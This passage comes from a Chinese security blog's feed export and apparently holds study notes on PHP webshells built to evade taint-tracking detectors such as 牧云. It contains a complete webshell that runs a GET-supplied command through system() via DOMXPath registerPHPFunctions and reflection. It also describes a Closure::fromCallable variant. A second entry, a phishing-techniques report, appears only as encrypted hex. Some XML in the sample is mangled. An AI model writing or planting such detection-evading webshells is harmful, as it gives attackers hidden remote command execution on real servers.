comment&quot;;N;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>这个套了一层反序列化，隐藏污点汇集点的方法与样本一相同，利用数组差级构造system后利用原生类Closure的fromCallable函数</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202208111059750.png" alt="图片"></p><p>进行命令执行（在牧云中array_diff([“s”,”a”,”b”,”ys”,”te”,”m”],[“a”,”b”]);这种方式会被check，索性换成动态控制，这样也能打断污点追踪）</p><h2 id="样本4"><a href="#样本4" class="headerlink" title="样本4"></a><em>样本4</em></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// dom and xml needed, install php-xml and leave php.ini as default.</span><br><span class="hljs-comment">// Author:LemonPrefect</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-number">3</span>];<br><span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">1</span>] =<span class="hljs-string">&quot;//book[php:functionString(&#x27;system&#x27;, &#x27;<span class="hljs-subst">$cmd</span>&#x27;) = &#x27;PHP&#x27;]&quot;</span>;<br><span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">2</span>] = [<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;http://php.net/xpath&quot;</span>];<br><span class="hljs-variable">$xml</span>=<span class="hljs-string">&lt;&lt;&lt;XML</span><br><span class="hljs-string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-string">&lt;books&gt;</span><br><span class="hljs-string">    &lt;book&gt;</span><br><span class="hljs-string">        &lt;title&gt;We are the championstitle&gt;</span><br><span class="hljs-string">        &lt;author&gt;LemonPrefectauthor&gt;</span><br><span class="hljs-string">        &lt;author&gt;H3h3QAQauthor&gt;</span><br><span class="hljs-string">    book&gt;</span><br><span class="hljs-string">books&gt;</span><br><span class="hljs-string">XML</span>;<br><br><span class="hljs-variable">$doc</span>=newDOMDocument;<br><span class="hljs-variable">$doc</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xml</span>);<br><span class="hljs-variable">$clazz</span>= (<span class="hljs-title function_ invoke__">newReflectionClass</span>(<span class="hljs-string">&quot;DOMXPath&quot;</span>));<br><span class="hljs-variable">$instance</span>=<span class="hljs-variable">$clazz</span>-&gt;<span class="hljs-title function_ invoke__">newInstance</span>(<span class="hljs-variable">$doc</span>);<br><span class="hljs-variable">$clazz</span>-&gt;<span class="hljs-title function_ invoke__">getMethod</span>(<span class="hljs-string">&quot;registerNamespace&quot;</span>)-&gt;<span class="hljs-title function_ invoke__">getClosure</span>(<span class="hljs-variable">$instance</span>)-&gt;<span class="hljs-title function_ invoke__">__invoke</span>(...<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">2</span>]);<br><span class="hljs-variable">$clazz</span>-&gt;<span class="hljs-title function_ invoke__">getMethod</span>(<span class="hljs-string">&quot;registerPHPFunctions&quot;</span>)-&gt;<span class="hljs-title function_ invoke__">invoke</span>(<span class="hljs-variable">$instance</span>);<br><span class="hljs-variable">$clazz</span>-&gt;<span class="hljs-title function_ invoke__">getMethod</span>(<span class="hljs-string">&quot;query&quot;</span>)-&gt;<span class="hljs-title function_ invoke__">getClosure</span>(<span class="hljs-variable">$instance</span>)-&gt;<span class="hljs-title function_ invoke__">__invoke</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">1</span>]);<br><br></code></pre></td></tr></table></figure><p>该样本需要一些条件，前提是开启了php-xml拓展才可以，其原理就是用XML去注册一个registerPHPFunctions，也就是我们想要执行的system再利用getClosure去触发该方法而构成的webshell，其中即利用到了PHP的特性，利用registerNamespace和registerPHPFunctions来中断污点追踪，从而RCE</p><p>&#x3D;&#x3D;打断污点追踪前执行函数就要设定好,之后再拼接&#x3D;&#x3D;</p>]]></content>
    
    
    <categories>
      
      <category>php webshell</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>钓鱼手法报告-CD</title>
    <link href="/%E9%92%93%E9%B1%BC%E6%89%8B%E6%B3%95%E6%8A%A5%E5%91%8A-CD.html"/>
    <url>/%E9%92%93%E9%B1%BC%E6%89%8B%E6%B3%95%E6%8A%A5%E5%91%8A-CD.html</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="be569d272754d9c8926b362d3fa1e3cfc6c7f599f50cf71d921b3548a765dee0">7d86b79689ab60361a9356d67b6bbcd5607fed1144eeaf16c8ef05b84114e7f7ceb28e796569e734179fbcbbc4e4f519a7b72147c1b8b4251c49abdd2177b8c756b2054bf883214da82accee43830d4f1ea4f780f03ba050107370b974294ecd72b51dc4ab7d7db15e7d638bb58057a789b0239b69fa7c4df5ef7cee046c3ca8dc877370ffb07739e0c7c46c4decfbd18497f3fd9d6e011c1c2c586488bd5a3041a49af4301faa324dafa995747226ac16492964cd26faa0d712c34ad2b0c2b1353d6b30a5bf427ff807259e09aef61832ac31be6783f5d41a6ceabb549aa6abcb5a654b44ae586e28ca483119a78bb84e1a3b1f5fc39a58dbfa89eacab620ab68e7d977a4476aae0ac28c3168b286b641434231a29f39a16f6b496bd9a6d72377d598ac2ba2161f8d2dcc24ece176333299f7f629830beca63429dccdb1ad3961b6677bcf58ebe7dd25fa5de62c2995987d2b1fc2c2759844e660923d73dc6b0a6033704c4ef492fd8032a583b2aba9654435b938f00c2cf465b9520bc0547c6f93039502b24cdf021145949d5d77b51890310e586a40f71ce3444458217cc16c7e52f5479eb77d123a9c6b577403d8175ea1537ee3d17fe9fa05fcf48f07ca1398f4f606c76ee78380cce97af84fee30bd55e8b649e9e5aead730406725d464e1847b8c3f8c91a613d7a0e46a7db83b5fa56e6e767e5b3f438d3c9e86e37adf944c0b15ed8a9202b2c4434410b0f41087d96aa67f6ced3bc4c741c90b024bc18f1564c986fdd6ec3746fa3628d1fa0bde50c9af5f080f7b0bc3c06bceee696d692a3fedfe7283ebf7defbe4e4b9b1e47d4c898375e45357c3f4bee62cfc0336b425a2fa9b650c580ad9c23f7f9a5010affb0931d57253cc7fe471253f8124fde987dbc868d6fb1bd0045281ecfcbb4861c729748104d295c6eb61ee29fbd83d8fd6f34afe377b63a40c7b5c6870b7bf253d4882c7c74a5d0f224f3a2c724e79ca4a2bc15dfa40e235b6e164f59d870497a58f1f6d75085f4d4295776b80cd7e1bda79a89fd8df2a96c95940cbf08e527f0a6014bd62c37a7cc61dd1f44d6051de003141a449219b36507269974b60c91d6416da0686074ab5b059cea06b74f327cdc34ae27c7b410175b30a227ebb484d0317691e5759a11d5ec30ec9e95e447eb9c036308bcc59a0bf589b2210a89f6eed61676b9b601ce80dbfac390b7acce8455c5dc7d5dfb5b26cf87032f966153811e54d65ba569797c99548355f8528f4f4133b6ff993060a9c1411f5c5283506b38d780c4f6c0d58c2ce6cf11eeda9ac4ade6d45375fc693de5445e04a165766e2b0adfcfc9007e5f22bd768bdd148e3acfaeb55f2df489cd68abdc51271fa31df03cffe9b5437b00878fabb0cca3d0d72c0347b45bcd2c38a1bbe75ab99c9294583009268dbc6f731fb4a378a0ba052d4c7750f4133ab1d561036b7151d2929aa385b74a4f0fc83b9436d0e404d193a9b644371616f36fa2b8623ee297a981fc98f4e27c7ee6796b457bd30a4062c7efaf9717118f392a4efef3b8cb69f63864d3331d8a0207e6f2f124c0aac947c91caa93e2bf11cf5536d47f5c6a7954b1d0f9c2b1b32df4f4a770c9769d5cb5b55702844f4dbe692afd5f71ca09bb14cf4c1e4e80129ea7b4f924891d9cc99c482ed91f810c006b1ce4e210c39b0b52f4776adfffcc9e62f0b62ea1122fb900ff75ce4e05c2854e08de30219f752a76ffbc92e4dfb78557ff36b730af397c45049ba16e33480dc99b121a633a61a78294cd7a9788a2cdb4e684d885ee2787e14f09f2febfcc43eff22ba296b7c41b080493b131d8988d3854bf7cac58e7c012aa2d5c3377185cea26d43262b3c9da16f649dda78e78859a09ab669e0122ac2146575c3b201039f75b4ff45d8d8286d79f98515960e01a6829b60d9047309185b3f0fad09dfaad652992a46444c0a56407c71641ce11e15bc3e5ac790956eafec77cad4729fb5079803e0a7e43d3823dabd0d11eac039c3a254abef3674989be67e90b232b04992bba4c6a2d2896835c9ee0096ebf809b97cfe050d934a19a690ca5ad7b11a07ff7bd401cb1bbfc853291170da5fde1882f6f84efbae84464c9116be6fdc10da933f6a3b0b3123ddf9fba69527978530ecb99492fa997699af9d6a8272de643e6b0d3d7241d44eb5eb11b6df46c6eecc56a1908ab44bc9f1ba047cd066bab725061e6135666f7a30f05215478e23eb96da60912d49aa5ee6e24e38f55840110a9fe44ce39fa7043ca7d813f1d2f10aa150d48022472528e204da56b3b35a8ac0af76edf43893c91a01a90f6f455175ca2ad11bd88ed8a7a1b5a8ce92b6b0b041ec4ff214607fc52476077be2f41d7ebca86f103f90f6d1952da18c5a40da073a6f83831111cbd84430542c7f9233705c372873f841d50b8ef2de8f9d57389b8aef96034990fc3152550cd1d55a777a135bd4d57779e5a3a54cf7a1ccf429a44606ec763c43356ab885541501b6fc5053ea5a23f22a35995f070c9ae61f793c603d041c6f0e7812220a1bc3269696d173b3aae7aa79998fc5feb678af5be7719790d5442ad2178043bca6646bcf7a4c17568e6e8212a2b23b5ba825fa5036c540a040303b8d8da259fbbcdc3a76b271edfcbeaeb11c7f1a678a37d98886118c93a3b5b26934b2f8696a85e2efbfb1ce3685f7f5fa213dad841bea72c84219ff1779ddeb2009a48a9e1d2cea8615dd82ef4d5924af4bc8bbc5b6c51bd414352def02e4ee75b44404f2f666f537b0dd5f6b7c16546f36636dc532588bbc3879ab5ac38ede115f3edeac79b0f9b84fa528399828daa242b2fcf09996951586768177f3bbd88236fc6df9dd7428e7f335a2eb3919f9af992a2b18b40a3c7c1729f5b72fc6eb460297d99fe3ef0a22d0a7be2736f5d78ff4143f8b9d7abce226c2494a36493531471633ae1bd8107f70b3d061d6d32894e559806c1bf1f6ec1f7163beabbe45d13d402902976c8592658923949d652fee6f727d4847a87d98d6acab6f3ada9541837dd28c10c8c7d01a1d8f3d9f2cbae383f533e87c717ea4379591d6260544b9aaec6d95f7c9d30a12397958831876ed252fd2d02b83da5528ae220239e95b8677842c359df2e0b4c214e2364d01752bc46f3183c0fec859a869c82a8c2acaec796fa1560d1e30c10e6b0f0d684b1486dd866deee4c295370b5f362361fb086629cf3154121bae870877679abfa81d751c812b57bf7cd31454bc0cec4bedd696b9ad5401cf8f3bb2952ffc9a31e6d00a084445a84caa01e7b25b40c3c912b1bdd185c37b1bf1ba79b6a7b96125ea7bd75bcfc5e54639d6e7854b2e346ca6ffa31f34c836770a459887b1d16c5d49f4cd791c1486c2c60cd094e04340be2c60a2c46a64b0aa1c1c8f5880925985882e94b2e4110bcea16072511635cfd4498cc33156b7bcb4a19585553f9433487764b421ca657a922f823fbcd7176c3ccb53c96ba4201e487b1017fdb661611f4ebd471cc1fc5346fe1ab155cd53dc9f58e5f25accecc760b6dff42ca6f50733ca34d14df2b1a0b5b60bd9ca7bed424cdc0191380c2572cdaf2f086385c4390553ba912a6318cedf05eb8e26cbfd8d85a805d89a75270bad35b2f43f605fcd4993916c8b6c4af527ef8098ad3937ed9992d20aa1f668f4161e7ca494789de534084a4f9b729445e54318cd396a3a18bb42ca16b1ef2362d5d2e50d59361fc58551da497aebca95eca6c47970332a2129aa465e1e987bcaf0c21af3e5091a3cfe08954388fa4c85bcaf69bce0d983ebb1028b76ce6bd4a178ac5e8d20a770b01678fbe44805c4cbd80c34b75a148f98e4a6d5e2afaa90e09ee3f3246786efc9e9da33a9c7d3ce4062a97dfb22e76b08617335dca3c5dedd0b4f10680976186d345f396f3b06d487af7c86ea6b34757d4b0935a64346273b44e20089dea37cac048f7686e96799846bf682985d17c383cc8cb60a5ac84e3e418b71bda79d6bea4eff64b9bc53e2bf10f9d2be8b5a989e7b386c25a2b5ab89931b3f7e4686d061574901cb1c41cacd0b0aded54285fcb2df78bba1a65f1675e39ace727b5a96f91a6ce05241d87589bdc7cacdc60f28b7cc0e0d5028d81934897dfc316aa57cd76dc81029877ab2e959335102a272ff5ea68d9486c6623b6e40db94f25d0cf93f22a2a6127bd0a49bf8fc4d8521613e16a07fe677bc968dbc72c9ae5889e8c47cd425adbe2ea10a87bd69ee006c42646985ea2b1791329079d218de0c090212fb940e9c32ce78668d883b8b38d88a0fe0592deba10bc1d862bebde17b325e42ce00cd924aa96a0fab029b713bdcefd686923be11d7cd68940fc5c0b0125d0052f22975f8d42dd34d6c5a8243161f126c02fd8d415da89b30940fde46e359d3aa0175752956533ba126060cd5cc8d0bc442ce30d250f120a7cbc9a2ea0d115b3b15d3d01f1c1fd10dba7d22eb9693d9f52fe7df42e106fd472fd8baf1f3540f5b4998f806f8da462dac0b44d5e7fdb0b897ec4159154c1e9d8e3a3ee0b2be001f3cfd87d74c344d7e071ff1f8070c22270f5560d0dbfba4e33bbac6274507773b5b7217fc8bf28a06fddc5952efffaa7e03a381757c383037b57b3e42acd00ef7d6f64a2352bdddaa2cf8fda532a2fcd71721297e008d2668a85707d5fc0ff04412039b7f428d7835f76fe542bb33f6ae208a29df8592787d315dde1922cace38b4f7917e9f1725ddda96945c927de4c310fff0e2f00db6ec6fc600c9b8b28846017daa303ca04280ef949fd867ee416cd78cd1634ac88832ab5fb3422c6b46e99f6d7447e33eae056a0d70766831b69332ecb66ad7c14ae249702c671f5c1f15dfe62864069020a232eb4b05af5fd856d28cba5b812c1809897369e1c8ea7a3ec0e9d26bd643c70aa3396ef7bb126ec7ae03858618429581bb0e5dfe4e56b5aebf857e092eb3d97fb7fed17b9c54157fc4260f531b644f4d54a2cae1d4fd3c1ddea20da0fd37facf958261ccedd7d4d12632068abe388a138f299f419a3c93a99d872a6a08b01ea087de00d3441876f41754336d28b964075aef0694e736a4793dbafefade6756a02962c2abfa495ea3703def0358d5c99b01797a200e6a57107efd5e210f78cf7105f7f87fb44d297e42e9f769fb2570cc354a07a89171e6d2ed162a2462cee85e4b2ec6e8affaa63f941d6959b653510655be02e4f729e5f12e89fa011842e7ce6c45c7d66ae4e481b0a3ec0a3ad6ddf55a8573bd37b6139bc52d36a087bc6568d2c3d1b3d8b6732ea117e5e4e99530d3e537ef9069054e4517b8f94b2396ca40a5e9e2025f95b2ba61a2924bd8fda2ab906486e5820f98c3388589139a5401df7d0b56932a033109936726b9a8e8a52b4e1270a487fd196570bc42856376a8dc8d149b0f1a2d32c311ab478cda71b46b9f6428afc4990186ac3bd3fe57db1d5c43e5d707d80b40000bf87099b47b1dc3c7e3051236d57814c63c5f88a69a2a0ed8b6bd06866efefb50ecb3b9643e0fd51e1516f2c359c577e0f1a9b3dd2dca114892ee3968b8396f890683a13cbe2b5b54a5a3513342e128043b4afdd2d41dd18aecc2100608e876f9ec88937eb752b2731fca2cd99e9d03dbdac6ce4cff9d94317f0fdf7bfbfede88406da9d204ec479cdcb4dc414bcf946cdf6ec0564d46a718c15790485dc9d275ae7d9f1d4f81d4ea43bf7248ff1319260845c98b5a9de0fa173d151128b522f303197e5f204f8b1a0237223387bcb490887c9850790cdabe276e0d8aa976bef51425afa150bcc27b6d19bdd1fa23fb030b421a7bfddfd6219f92e0d9982d3018e8c7555429e61c4c40a174984b57a83093452514193b249341abdd75cc634205bea0c42478a349d488d16cfd899891827740db120b99812045c932888eba8698c3043239bcc271e58bae2bab6001892800eab06634064444bee062592b6723d90acc4de80fa48d05d7fc324339b5b1b750bf0512c89dd7de167340cf3f9f0d4caee2c77f681199f55011dfd7d8aef848c89d470601efe7218e7f02e20c2dde7a5d05d4cdaf3027189438ecae18bd16b8b322a161a3a9e7f6a95d34446c995d025bb872c4ef466f39cd57cf2c1195c1e3432318480d77eb0f3e6d99b475f25fe512fe0582877cd07049cdd53dd5e7060fa796cd8002dc0d56c73fe7cd3eaa98428b94550c0a08e4628a4d59b28a0973e67f25e8618dd305ac7f96e5783334ac84728af3d8e7b9ebcf950429465ef5e848b431f52db523af761145345f4621e1b0c361c859b8cbc8289fd7f122318cbee3b49d0321f5df4c512753a7a669ee41f03c2e0365dc0863313d2304c98bd2197b1a17ad099b8505a7e24c928475d9ea77a3797db5f334a38c4418d66603a209d23c793a620241447bea2c924ad832dc62c99047398406ed44cacabf5973ac9966d7d453c9ee071a623474448caee0e6c5c534cbc993b1ab7e992fca1663ca8ff1fb98ef89bbde25822c9b4c83af18fa317810bf2a7c738167979113dc04e5031918fa45a52cbbe348e2a107723b5982ff8bcc842e1897a589d4b90df681bada54b3f15f39d41a605a15c473b14b3af8d77b6e6f81752f694b14fcb84ee5535a59ba2db1792a9f26b2ba723835db0d19f44d0e3cfb0d66f3bf18e49b28e8c70028c7350c03f496c131f525f6b0572619c2c8be700aec3ad51f4e01c571bacebfc4fbe4e648d55734b88edb18ae8b0fc708940f6bdd0b11d6e9b1b43c37620804a77a68b805bf3aaee9f37292269b8cb70c68ecae0dd93df97b2a9d06eb97d2630d8b3c9de5dddc5c9840e6043c3b101c61ab2c59a671aef6af77ff449e2b3aaf72f3e5c88aae0ad1737991274fa8d2c7247c23eb73f3478ccdc5c37a9311861988c2c3320aa7e64c157eff26506367d6fb94df8c3a4b8a39046fb8d2dd8225959d4af0c3b592d3a7eb2f569f05c7efb64f7dd113af49275eaa93d589815902b70d8923d9914778586613d286b371dc3ab87770e502a65432e1bd3148dec3b04ae19ddd2354f3a3ae38755bdfa7910323cab1cb23b47d38edac75b8700af0dade915bbb80204953a3ac8891473a24bbdac8babcbfe32dbb6a51070e6e2bd34ee8082ec70fbf2f0f92987e234f5612e09e33409603e80a5fc2759b72081316a4e937bffb27fc9d7dcc9e2aca1cc78e320c0c9f8f8dd26f403ed210c3f48da9292066f3e153e5dbcc7a8036d63bf268d0fe22272d853bf7f7a3357aae14922f617cc84f61cff1b2516c684b0387ab5f0d124f4caef07eb6146e6376e29da5bf5c7dbf034217174df72576f724a22b0f0079643de3bdb9fb6920d3b9a5add8bbb23ee720ed695655a277f8a6bf08861349f77abb2edf1e94b60c206f30aa01fd1e36ab7954adc27be291c6e21f584969c67650e91365e7e5817e8024c071d84b0c98226d1213b80c221c430b245fe30dd93a54e7d84003c0d275ebc0e527a9913a0fde0c3cbecdae6ffc1a4b3b7bf9a2541470e5729e3fae260a0075be8f8277325d3be741e5bbf845e4d1141c2702695cb7edb41df46c448e782241cbe4842d175006733e7a78708536f1ec8784fec578f44894ae6568fd50759eedd34493d93bbfa90d674550b6c07f82b87fd13caa53f533b71f965d0342dae0bb8592b67031523b4e76aefdf9b378840b60c50a849c9cf8e29d7431e3979689f590b3ef99697a18b256db49b6114bf75455a95171db8562929994e816576e2fd03ce8c619d548ae9084b180103db6d951e2a18a6a50d891b09e69e1f91029098a243fc5fb071e9bc4c4a5135c711873e54aa9d0b9b9715407de0f8ba16b0a12032db5fc890d66681bcc6ca099df30b8a8c15dad3d834e886dd0557a4906dde0906af87b370db9ee7873d02a5b6de8d92dac696fbe5e0bb6a39559f90d45d291b74c380d0db6f23ebddc0929923490b7d7ca3c632b662a644a183bb4b24a01f5850a9ffccd7de80cf0d0ee12f5c87b26d80a4206439365f0378fc0014124c3f400a92404adc56d262a39d251d7adf40f485bb823895f365faa46d3776580b5cf08659697088eb32e7a8526a4f638c11186dd07ea53015f101a42c6f892d5d22af3e35750497eff9275544ad154c3004772d8efeef8566d0c666abea560aeea2d0e703f642115bac686e51d20419ee39072b71f38bba0370353f0c559180f5e575bc3c0fa15a09ab2f2fc0d0e8d2aef456e3993511a9762a2cd9a38c26f2f0f55534cef7defa442052d5e7ad6f3a89defeb7638c04c7e65c0de959ce84bc84f96afa409a6af32034c9918dd595838c03ce6cbb6dfb6db9ddebae5f78b14ff54ac9c39ce8aac7b781528ddfe51ebaffc3fb791f874eb47c8531e32f65f74b2391c95734a43d26016bcfd19b49f6b21aed4221f15d2f6204370e63e71b2a13f6f0511742e52a52082db366b38ded1ee4705aeebc21b9ba534768fb7690683511b25620691fbf82f0faaa0a0ad03507461b28ddcbc5fc8a01088d7ffeb3b4554aebadd796877f02e0f2639ae3af0a21272e17fd8f229e7058042919752c7e59117a97b949d8f059d5755507c4305267d688f15f2f21a3d2469e060b76524ff64a5fed76a8433d60ca6a8843dd983c217a6692667316eec3047c192a1a7a6bf3a397f218591d9f886ba6c14193ca8fa0b974b96ba9c0a4404d78f561a4175dc3447a4676a528f246804c2604fc6d100354e3dd07a902bf293a2d6b0b19312e1fcaa8b7cbdc4ecdddb66d4f9602fe62fde8f065e0fc9f4513f307ebb4e00300f6b4064271c1f180cf6164ed594c63e3f4ed64f41623d12070853a0944d3c6a04d3a119c59406973129ef78e304e354ddb18da31ce374e7e7155e927eee8c5d6d25e08db83127435295816026d5aa7a317a52e41250c5281e9f9f1f1c1f6534b045e081cf7c96e50777f48524939777309c99fa9df4bd0241b2776e2ac41dc9ae00b174ee84b3910833f96af5c9aef6f2c57abe6b315cf62f859fe9558342f019db54b22e7e81edcf72eea32b9b3a0777a2c453cf8297299b64f6cce401cf8aefc2baecfc4d05ab59c5c512fa62ddc222335763e47043e41b6afc69913a8befead527cf922f41450914377cd63806d37a78932edc6fabd24255da984c58dd5c40eea9f7620a747c39e499a35017166b41d01903e9e79c42bc83237b1868ed901c44e512de3c43a45cad2bcf52791ec540ee95a86dad9b3b73bf858cc6130ff205ebf1c4b22f775a0dc8076750070e85eb179cee0836566c31ebf9740eca506eb8cdc37dff2a4c1268db321365a58f492308986ba677dbf9bfd419a80bd733482222b0c924698f476eeca66f3cb199e956f1b48610deddc6449d9095195b7e35bac61cc7d3b98d6fa21a5f55190c9e3425d7f59b2e2ad304f79d476f75469b835535f6e4e471ad536bde65bbf300eac9dfb95fd7c09f3364cf16a1c14091c33df597f85f22bd1f13bdbbb75b6dad437905cbb196d406fa1c385ed61da8bb6fa0d70d5aebfb91c082eee3eeefde4f92e07665ab276653835c4885ef6397c602f5ce94bb0c5f3238e2feba8faf6493d70e33d0074512175c2e7cf1bac0b1faa7c1e90b9bec1db2c8ef5f3da184706b94daf9d26cdf18d67910ff3ae04211455d8f7abe80097e90e30384d705ac69bc7e7b3db96c16201fd90243267eef8966e80cdc99333baf63c15cd567fa36e40925ba9b85aa599eba45d0e75e952bbde24c4a078e0482fdd96b4f6a761b6b1a53b2596593a7146249e9e79477fd57d27dcae93a3ad2953adbee53b885dd1eff610b3f247d88335589e98afdbc185322bc89b273bc5e8af7798b03c2dc582084d655feb5776c35e621e7a766f4aa5505c0cb8e4fa7dff949e83a627e9d0f18a085baed58b6b10e9af70cc1cc4e323e266279dbf2f41c6661a5a61c12e015ddbd6467fc832cba013e5f4886f1d1f00d8e6c210a16dae97dd1d8cd041063f78983453ea97cd0734801ed2f801c1cc228ed8b525db15c96b146241026395898beb60521fac3dd1d505cbcc30359ee46cecb4c852fd87222817291f376063ce338070c73ec9e00f7e72c6306a17a7948a83ddc1ffa656905d56bd7524730291ba59911603184c17d93d0317e62bd5d6492eabcb8d5c01903d0e91f26b3d14b26afee0fb5a4f1b55be5bcf64c79592d7986d860996c361d05f9c6af89e4865e28444c83260b225e3a4362f44c95e14f089ce1a82c0b593409a7e5e8806666e6e79fe1e0eb3b719aed7d979bc6cf70cbbbd8963fa6dc3062220eadcab54b0b74ea26fde6ca920e80e6a0120622f0d28d1551e5b72343da88d400a7788ff1785d0f7a1b4ec0866be49c58304868a0878e6bf34b942ada1f037ed4b4d7972527efa1a6ef64c4d99706f21a81f4a32707a5d8779364cb6419b46d64e3da97c26209c00211d5dafafa02aa6c65986366b234146090e8e4275fed80b25e5f3c9c3504c7b45140cfafe8ce22fb61e58e83d548c4d1e25d64b9d1f8b1ce7f0045cca5f6c3d24c573d8c0b608aa6ff7f3951aa87d11f15739f952cd091d3d6589aab58cf28468729512c42ac7e531cf32cb3232ba75fbb568577b4c01fbac4b851e73fd56cfd3582e7bdc531a01058f844bdef275edf4d1a04b3089393dc185bed3e36dee4c6f5723e8586a2bd7770a788f40f9589f1b67e81455adbf2ccb441fb6255a0a925032b6811fb11c40b2cf20fa8fb27cc774ab8bbd9e6bdcfa00eb880b23b20a035c2766eaf011167a47b8c378f7239f67b5be69e7ffab51b27aae154c2172cd5ae2a4319ecde59df1d3bc5b1a9d1530a603b00774176861dbb0c19378bf0b03dfe985e24512c650d198cbe62f9b09e879400abb736f6b7caf45e541d619f66cb0adb8e0acae034f3cbb51ff2d5b5b4d90e65dc1d9923531ab117d1c39eae0bbc4587526d4238664ecc4c5f4187ffff261dc250a7e22d4df731d7d4cd971681f9a485e59cdefaf68c9b094145697f3b2de7cf54389a2a1f78b140731a77761536fb5abdc475f064664ff9ecb90ac795433e7d0ac4b07134a3a6db595fe541eb2ea2f61dc92640dcfd8a123feda0dec6c96500af0aa354a28c6816a443ebf9955cc25ebfe43ff8f01fbb2244c4c58b7aea1b8692c0e8b2b6b66574b53e1a2d661c670d1fba3b10db8ad055efd1af3553a0551758394b745fbc1df3be94b2a225ca336e6f8c03da4521e4c4685caad972b4ac809802d5b73c428681d4a16b9d6ae4e8bba97232962bc280421a7e6d009f7d285b0f2353c844e29a243992928a7dfbe677009034d80e432bbb50426974780bbf27a2942766c419499d83aba228b33f3203b8b9db0a09e0d994caad7fab1de88186b63f4273cc48da3700d1ebef640d6c443928a688ff94c3bf9ce1279d7aa7d57bfea558735009d435053d28b32a7911106a6a3e51f640e13cfcd967f53ce9e12f2387978152a6da9d8ce651d3b8e735c0bf7543cbb08044afd99ca28fd622d7f24a794498325d31fb1780e36e4068d06ba3bb092597a5fd3d493d78ca8def320d6d70b0c4a800f3f10e5b979b3f4d0c1a372df48a7f4d356c3593de5f08cb10741fc7141c8dc362c117c1ea4cc6f7e3ac6fc789f84e80562b823c8e6c03a075904b998f0e07d7ab34f19d85f40376b1a4243051146f8e67a1a426c7972aa263f09c6a75394cbd4acfd83c0c6ac35b03f429de1d928f50d9d2539aad5c4c7fddfd7cd6881f69b37d604b03a63c4e4dea355bee75a2595ea7fcbc580964b81ae66e268e49db3af4eac9ec2c9e143241f2f14f358e8a73b242d80792dce7a43ae3fbdedf9f63363c3de7cbc51def5ac728a385b6023cfce0ad0751f4f4a7ae08eed4c82b37fff7bd4fedbacf41fad2ed482d0ee5ff1b4025c76c9494e06470d9cebbcca2ee84ff61ba970f102c148c4774399a88c80b14e8c3f2a5d0f44b98318ada952591819081ac8ed6d29f8c6e9d4823bdc6d58143005f6623e819141402061f50a50e815387bd0b2daeaa73c291e2376cfb835db2aa493d531709aba279a9e95d42f0795cb49cc9d04e1f91c35e7509e157a2a6c1793ba252845882a0c73dfea22c39a674b7eaf30dc9f5be555f6e6a580919837f327ec43d80da9ffb8556553aaec7fe7a1481ffcc30350988c37fb6b5efe1431361d9027acaeb1f08d59ddcc3c71779b2628a1e23433ff351f599a2d8a08223b3286d73fd616d82545f9e961ee339278447c2ab96f7378c545b755d15ffb0d23ae568701a228551ec4437273dfda6b3959cdb49f37e36b4f2039ceaff231145f67fa1fac845f5c244f5d327a3e20325b652af035641cb461b9a57173bbf3d3f94bdf5ab05ba28801900653a26890fdb7b3f9023d01a8582777ecb281e55d0aaeca137ecc22db669140191aea08624bbad107ec7a9d4a98a9f03ab13edecf693fd42a1e12ba7f1aaec1a01657d7d3dc3e683ff6f074e2d12515112382a93e61518a3a8ce7f386cfd0a56cc5d9780c3279e349aa6086d3db3c90169018232df0e08f314b4c7a322f9f9dbe214bb14b60abf9462bce8b18ae690fd7059ea4c3dd2acc0f8f61cbf7e721291516e1d375e04bdc16919eb5bfd5c81b27cd3bfdaff665d9c90c513bc61c1a19be9eca680d40ca19c925477a5177c6475260ac64113321a2adb3801b6ba14adc580f91e60f5e945942c7500afc10a90bfc220532b2a8655870fad6a4bfd5671769a0b728f3e3b42b086f07292ee9750778b58d891ce6a555fd6b2b16c29cc5bc333d8263ef27ce71f09e906837bfdfb53839ab72cd2ff964e7a04cc689fb3b9d47ff647bb58ffbaddc64a7fcce5d18ba0f8b9044cfeafe1ebf8ed4d6e452228430f8ad01db64479099adc6c408d4b2b4623492482923b8bd762d70d0cf9cf7b7106d5e31a19e5b43de5dc3fe025d319b4ead298c4273072f0a7ff230a356a4f077c45dd86b16cfd97c69f5f85f77cb20cd8911f7fcf09470413a0d82098e6f7759a8d547d7a4a298b276e18818d92f195f9e2167bf296fdcfba5b49d14146688b40277e1d22b2c32c2386042204f946dd4286e26af828448e10ad385d4436644b214b7586df78d859f5ed70d6c6c95312dab281dfd3d9a8646f561db6727bbb32f558ba6f3947d04f7923993ee1693cb1f7fdfa76f8edc79897b244e30e0dddf38d276b66dc06ce1f31fc3580bfb9e33a79792652c96b71c6721839feb4ed3746de04810d5e66e74f4535b934eaa455130bca2bea9747ed8510b60efc9d0f1b86ddb9eb519f3b2bf2ffdca09d9a416c8f59ba1272c1b6fa5ad2e281ebb03affcb08ee262c230403e9e30afb193e42fa8053118f32d00cc492a52a47b67385b4